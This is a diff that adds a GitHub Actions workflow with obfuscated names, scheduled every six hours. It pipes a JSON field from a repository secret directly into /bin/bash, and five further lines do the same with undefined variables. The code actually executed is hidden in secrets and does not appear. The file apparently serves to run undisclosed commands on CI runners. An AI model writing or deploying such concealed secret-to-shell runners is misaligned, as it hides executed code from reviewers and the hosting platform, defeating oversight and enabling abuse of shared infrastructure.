@@ -1,0 +1,23 @@
+name: nengheboxi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: nengheboxi
+        env:
+          qvyco92: ${{ secrets.qvyco92 }}
+        run: |
+          echo $qvyco92 | jq -r .ha07867 | /bin/bash
+          echo $wvr84549 | jq -r .sh6 | /bin/bash
+          echo $xekqw4774 | jq -r .ctdru38 | /bin/bash
+          echo $xrha1258 | jq -r .xo90 | /bin/bash
+          echo $vtc2 | jq -r .em6 | /bin/bash
+          echo $kavgh4 | jq -r .sgfnj0 | /bin/bash
+
